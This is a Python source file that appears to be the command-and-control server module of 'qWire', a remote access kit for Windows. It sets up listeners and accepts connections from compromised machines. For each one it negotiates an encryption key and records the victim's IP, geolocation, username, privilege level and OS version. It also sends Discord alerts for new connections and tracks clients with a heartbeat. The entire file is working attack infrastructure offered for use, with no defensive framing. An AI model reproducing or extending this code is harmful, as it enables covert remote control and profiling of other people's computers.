#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.21
# -------------------------------------------------------------
import socket
import base64

from core.utils.utils import ErrorHandling
from core.networking.utils.IP_Handler import IPAddress
from core.threading.threads import MultiThreading
from core.logging.logging import ConsoleWindow,ClientWindow,NetworkingConfigs,DiscordCFG
from core.encryption.aes128 import Encryption,Decryption
from core.utils.utils import Notifications

server_socket_obj_array = []    #User created listeners/sockets are stored here
client_socket_obj_array = []    #Client socket object is stored here. This is used to interact with client
client_information_array = []   #Client infomation is stored here like port, ip, computer name etc
active_sockets_array = []       #Bug fix. make sure socket is not already bound when opening gui from main window. Port number bound to socket is appended here
job = False                     #Set var bool job to false for connection handling

BUFFER = 4096

#global job_array

class Utilitys:
    #Function retrieves client socket from array by index int passed as parameter
    def retrieve_socket_from_array(self,socket_array_index):
        return client_socket_obj_array[socket_array_index]  #Return the client socket object from the array by the index parameter

    #Function removes client socket from array by int index passed as parameter
    def remove_socket_from_array(self,socket_array_index):
        socket = self.retrieve_socket_from_array(socket_array_index)        #Retrieve the socket from the array by the index param
        client_socket_obj_array.remove(socket)                              #Remove the socket from the array

    #Function will return the client_information_array
    def retrieve_client_info_array(self):
        return client_information_array                                     #Return the client information array

class ServerSocket:

    #Function creates a new unbound socket object and then binds the host and port address
    def create_new_socket(self, port_number):
        #if the port number is in the active socket array, its already been created and does not need to be bound again
        if port_number in active_sockets_array:                                             #If the port number is in the active sockets array
            pass                                                                            #pass the rest of the code. else,
        else:
            try:
                self.new_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)          #Create a new socket
                self.new_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)         #Make the socket address reusable
                if self.bind_socket_to_port(port_number) == True:                           #If the socket is successfully bound to the port,
                    return True                                                             #Return true to indicate the socket has been boune
            except socket.error as error:                                                   #If there's an error,
                #Raise a notifaction with the error string
                ErrorHandling().raise_error(str(error),                                     #Raise error
                                            '',
                                            'Error')
        return False                                                                        #Return false to indicate the socket was not bound

    #Function will get local ip address of chosen interface, bind the socket to it and append it to an array for later usage
    def bind_socket_to_port(self, port_number):
        current_local_IP = IPAddress().get_local_ip_from_interface() # Get Local IP from tun0 interface
        if current_local_IP == '':
            ErrorHandling().raise_error('Socket could not be bound to empty host string',
                                        '',
                                        'Creation Error')
            ConsoleWindow().log_to_console('Can not bind socket to empty host string')
            return False
        self.new_socket.bind((current_local_IP,port_number)) # Bind socket to interface and port
        server_socket_obj_array.append([self.new_socket]) #Append bound socket to array for later use
        active_sockets_array.append(port_number) #Append port number identifying socket so it wont be created multiple times
        ConsoleWindow().log_to_console(f'Bound socket to {current_local_IP}:{port_number}')
        return True

    #Function will remove socket from socket array
    def remove_socket_from_array(self, socket_port_number):
        server_socket_obj_array.remove(self.get_socket_from_array(socket_port_number))
        ConsoleWindow().log_to_console(f'Destroyed socket bound to port {socket_port_number}')

    #Function will return string list value of single socket by port number
    def get_socket_from_array(self, socket_port_number):
        for socket in server_socket_obj_array:                                  #Socket is a single socket in the array
            split_socket = str(socket).split(',')                   #Split single socket into list
            port_number = split_socket[5].strip(')>]').strip(' ')   #Get port number from laddr and remove last bit of text --> )>] and space character
            if socket_port_number == port_number:                   #if socket port parameter is == port_number
                return socket                                       #Return Socket Object

    #Function takes server socket object as argument, starts listening on socket
    def listen_for_connections(self, server_socket_object):
        server_socket_object.listen(10)                                 #Listen on the socket
        self.handle_initial_connection(server_socket_object)            #Handle the connection when the client connects

    #Function retrieves socket object from array, Passes it into child process to start listening for connections
    def start_listening_on_socket(self, socket_port_number):
        socket = self.get_socket_from_array(socket_port_number)                                             #Get server socket object from array and store it in socket variable
        MultiThreading().create_background_thread_arg(self.listen_for_connections, socket[0])               #Start new process to listen on socket
        ConsoleWindow().log_to_console(f'Started listening on socket bound to port {socket_port_number}')   #log message to console

    #Function creates the client socket obj, sets the timeout to none, passes off the beginning of the handshake to another thread and returns itself to continue accepting connections
    def handle_initial_connection(self,server_socket_object):
        global client_socket_obj, conn_info, job                            #Set globals for accessability
        client_socket_obj, conn_info = server_socket_object.accept()        #Accept the connection
        client_socket_obj.setblocking(True)                                 #Set timeout to none
        client_socket_obj_array.append(client_socket_obj)                   #Append client socket object to array
        job = True                                                          #Set job bool to true
        MultiThreading().create_background_thread_arg_arg(self.begin_negotiation,conn_info,client_socket_obj) #Create background thread to handle encryption negotiation with client
        while job:                                                          #while the handler is processing a connection, do nothing
            if job == False:                                                #If job is false,
                break                                                       #Break the loop
        return self.handle_initial_connection(server_socket_object)         #Return to accepting connections

    #Function will get client system name, check for/create directory for client, begin the comms encryption process and send the key to the client
    def begin_negotiation(self,conn_info,client):
        sys_name = client.recv(1024)                            #Get client system name
        client_system_name = sys_name.decode()                  #Decode name
        NetworkingConfigs().write_data_length(len(sys_name))                       #Record encoded sys name length in bytes
        client_information = []                                                    #Create array to store system name, public ip and port
        client_information.append(client_system_name)                              #append system name
        client_information.append(conn_info[0])                                    #append public IP
        client_information.append(conn_info[1])                                    #append client port
        encryption_key = Encryption().create_encryption_key()                       #Create an encryption key
        b64_encoded_key = base64.b64encode(encryption_key)                                      #Encode the key in base64
        client.send(b64_encoded_key)                                                 #Send the key
        NetworkingConfigs().write_data_length(len(b64_encoded_key))                  #Record len of data sent in bytes
        return self.finish_negotiation(encryption_key,client_information,client)                                      #pass client information array into next function

    def finish_negotiation(self,master_key,client_information,client):
        client_information.append(master_key.decode())                                                   #Append master key to array
        extracted_info = Decryption().decrypt_data(master_key,client.recv(BUFFER))   #get extracted info, decrypt with key
        for information in extracted_info.split(','):                                #for each piece of info in the extracted info
            client_information.append(information.strip('[]'))                                  #strip array brackets from string
        self.organize_information(master_key,client_information,client)                                           #organize client information for further processing

    #Function organizes array for later updates & ease of coding, appends client info list to master info array
    def organize_information(self,master_key,info_array,client):
        location = IPAddress().get_ip_geolocation(info_array[1]) #Get location array from public ip address
        try:                                                        #To catch error
            location = f'{location["country"]}/{location["city"]}'   #Parse array for country city values and cat to string country/city
        except TypeError:                                           #If location can't be retrieved
            location = f'N/A'                                       #Location is not applicable
        new_array = []                                          #create new array
        new_array.append(f'{info_array[1]}:{info_array[2]}')    #Append public IP and port as xxx.xxx.xxx.xxx:xxx new_array[0]
        new_array.append(f'{info_array[4]}')                    #Append local ip as new_array[1]
        new_array.append(location)                              #Append ip geolocation as new_array[2]
        new_array.append(f'{info_array[0]}')                    #Append system name as new_array[3]
        new_array.append(f'{info_array[5]}')                    #Append OS as new_array[4]
        new_array.append(f'{info_array[8]}')                    #Append Windows version as new_array[5]
        new_array.append(f'{info_array[6]}')                    #Append user as new_array[6]
        new_array.append(f'{info_array[7]}')                    #Append privilege as new_array[7]
        new_array.append(f'{info_array[3]}')                    #Append master communication key as new_array[8]
        client_information_array.append(new_array)              #Append array as single item to master info array
        ClientWindow().record_active_connection(new_array)                    #Record information for active connection window on main ui
        Notifications().notify_new_connection(new_array[3],new_array[2],new_array[0]) #Notify user of new connection
        if DiscordCFG().retrieve_notification_setting() != False:                   #If discord notifications are enabled
            if DiscordCFG().retrieve_webhook() != '':                               #IF the webhook is not equal to empty string
                Notifications().discord_notify(new_array[3],new_array[0],new_array[2])  #Notify new connection via discord
        return self.complete_handshake(master_key,new_array[3],client)         #return complete handshake function

    #Function completes handshake by launching heartbeat to see if client is alive
    def complete_handshake(self,decryption_key,system_name,client):
        self.launch_heartbeat(decryption_key,system_name,client)                            #start heart beat

    #Function returns boolean value based on if it receives the echo from the client
    def receive_client_echo(self,decryption_key,client):
        echo = Decryption().decrypt_data(decryption_key,client.recv(BUFFER)) == 'echo'
        if echo:                    #If echo is received
            return True             #Client is alive
        else:                       #If echo is not received
            return False            #Client is dead

    #Function creates infinite loop to detect if heartbeat has been received or not
    def launch_heartbeat(self,decryption_key,system_name,client):
        global job                                                                  #Make job var accessible
        ConsoleWindow().log_to_console(f'{system_name} has connected')              #Log connection to console window
        job = False                                                                 #Set job to false so server can handle next connection
        while True:                                                                 #Start infinite loop
            if not self.receive_client_echo(decryption_key,client):                        #If the server does not receive the echo from the client
                ConsoleWindow().log_to_console(f'{system_name} has disconnected')   #Log the disconnection to the console window
                try:
                    client_socket_obj_array.remove(client)                   #Remove the socket from the array
                    break
                except ValueError:
                    break
        ClientWindow().remove_active_connection(client_information_array,decryption_key.decode()) #Remove the connection from the active connections file

    #Function will encrypt data and send it to the client
    def send_data_to_client(self,client,encryption_key,data):
        encrypted_data = Encryption().encrypt_data(encryption_key,data) #encrypt the data parameter
        sep = f'{str(len(encrypted_data))}|'.encode() #Create processable string with length of encrypted data for client to process
        client.sendall(sep+encrypted_data) #send the length of and the encrypted data